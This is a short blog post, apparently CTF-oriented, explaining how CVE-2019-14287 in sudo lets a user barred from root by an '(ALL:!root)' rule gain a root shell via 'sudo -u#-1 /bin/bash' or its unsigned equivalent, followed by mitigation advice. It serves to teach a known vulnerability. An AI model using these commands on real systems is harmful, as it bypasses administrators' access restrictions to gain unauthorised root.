---
layout: post
title: "ALL=(ALL:!root)"
date: 2025-03-08 00:00:00 +0100
categories: [thm, hacking, linux]
tags: [sudo, privilege escalation, root]
---

![power](pics/power-0307.png)

### I want to be root!
- Usually sudo would be used like this:

```bash
sudo <command>
```

- But it is not the only way ...
- Let's imagine you ran command to check what commands could be executed by user as root and see something like this:

```bash
sudo -l


<user> ALL=(ALL:!root) NOPASSWD: /bin/bash
``` 

- So don't hesitate to try some [CVE-2019-14287](https://access.redhat.com/security/cve/cve-2019-14287) magic to become a *root*:

```bash
sudo -u#-1 /bin/bash
```
or
```bash
sudo -u#4294967295 /bin/bash
```

In certain non-default configurations, sudoers can be set to allow a user to execute commands as any user except *root* (*!root* or *!UID 0*).
Due to an input validation flaw, if a user specifies a UID of -1 (or its unsigned equivalent, 4294967295), Sudo incorrectly interprets it as 0 (root).
This means a restricted user can still escalate privileges and execute commands as root despite explicit restrictions.

Quick and easy!

### Mitigation

- Upgrade to Sudo version which patches this flaw.
- Review and update sudoers configurations to minimize unnecessary privileges.
- Use principle of least privilege (PoLP) to restrict command execution.